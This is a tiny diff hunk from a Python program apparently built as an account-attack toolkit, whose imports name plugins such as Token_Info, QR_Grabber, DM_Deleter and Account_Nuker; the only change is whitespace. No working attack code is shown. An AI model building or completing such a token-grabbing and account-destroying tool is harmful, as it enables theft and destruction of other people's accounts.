@@ -11,7 +11,7 @@ import utilities.Plugins.DM_Deleter
 import utilities.Plugins.Token_Info
 import utilities.Plugins.QR_Grabber
 import utilities.Plugins.Account_Nuker
- 
+  
 if __name__ == "__main__":
     import sys
     if os.path.basename(sys.argv[0]).endswith("exe"):
